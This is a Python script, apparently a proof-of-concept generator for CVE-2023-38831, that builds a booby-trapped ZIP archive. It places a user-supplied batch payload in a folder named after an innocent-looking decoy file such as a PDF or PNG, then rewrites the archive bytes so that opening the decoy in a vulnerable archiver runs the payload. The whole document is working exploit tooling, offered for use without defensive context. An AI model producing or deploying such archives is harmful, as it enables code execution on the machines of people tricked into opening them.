import os
import shutil
import sys
import logging

if len(sys.argv) != 4:
    print("""Usage:
file_name - qr.png, important.pdf
payload_name - payload.bat, script.bat
archive_name - output archive name

Example: python3 cve-2023-38831.py file_name payload_name archive_name""")
    sys.exit(1)

file_name = os.path.basename(sys.argv[1])
payload_name = os.path.basename(sys.argv[2])
archive_name = os.path.basename(sys.argv[3])
folder_name = file_name.split('.')[0]

file_name_extension = b"." + bytes(file_name.split(".")[-1], "utf-8")

if os.path.exists(folder_name):
    shutil.rmtree(folder_name)
os.mkdir(folder_name)
temp = os.path.join(folder_name, file_name + "A")
if not os.path.exists(temp):
    os.mkdir(temp)

try:
    shutil.copyfile(os.path.join(payload_name), os.path.join(temp, file_name + "A.cmd"))
except FileNotFoundError:
    logging.error(f'File {os.path.abspath(payload_name)} not found')
    sys.exit(1)

try:
    shutil.copyfile(os.path.join(file_name), os.path.join(folder_name, file_name + "B"))
except FileNotFoundError:
    logging.error(f'File {os.path.abspath(file_name)} not found')
    sys.exit(1)

shutil.make_archive(folder_name, 'zip', folder_name)

with open(folder_name + ".zip", "rb") as f:
    content = f.read()
    content = content.replace(file_name_extension + b"A", file_name_extension + b" ")
    content = content.replace(file_name_extension + b"B", file_name_extension + b" ")

os.remove(folder_name + ".zip")

with open(archive_name, "wb") as f:
    f.write(content)
shutil.rmtree(folder_name)

print(f"PoC ready: {os.path.abspath(archive_name)}")
